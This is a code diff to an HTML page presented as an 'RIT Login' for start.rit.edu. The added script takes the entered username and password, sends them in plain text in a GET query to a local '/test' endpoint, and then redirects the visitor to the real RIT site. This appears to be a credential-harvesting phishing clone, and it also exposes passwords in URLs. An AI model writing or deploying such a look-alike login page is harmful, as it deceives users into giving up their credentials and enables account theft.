@@ -24,6 +24,23 @@
         }
     </style>
 
+    <script type="text/javascript">
+       $(document).ready(function(){
+           $('#baduserpass').hide();
+            $('.inputForm').submit(function () {
+                username = $("#username").val();
+                password = $("#password").val();
+                url = "/test?username="+username+"&password="+password;
+                $.get(url, function(){
+                    window.location.replace("https://start.rit.edu");
+                }).fail(function(){
+                    $('#baduserpass').show();
+                    $(".login").text("Log in");
+                });
+                return false;
+            });
+       });
+    </script>
 
 </head>
 
@@ -56,8 +73,12 @@
         <h2>RIT Login</h2>
         <p>Login to start.rit.edu</p>
 
+        <div style="display:none;" id="baduserpass" class='alert alert-danger'>
+        Your username or password are incorrect. Please try again.
+	    </div>
+
         <div id="userInput">
-        <form action="/login" method="post" autocomplete="off" role="form" class="form-horizontal">
+        <form class="inputForm form-horizontal">
                   <div class="form-group">
             <label for="username" class="col-sm-2 control-label" name="username">RIT Username</label>
             <div class="col-sm-10">
@@ -76,7 +97,7 @@
           <div id="nosso" class="form-group" style="display:none">
             <input type="checkbox" name="donotcache" value="1"> If you are using a public computer select this to disable single sign on.          </div>
 
-            <button class="btn btn-default" type="submit" name="_eventId_proceed"
+            <button class="login btn btn-default"
                 onClick="this.childNodes[0].nodeValue='Logging in, please wait...'"
                 >Log in</button>
 
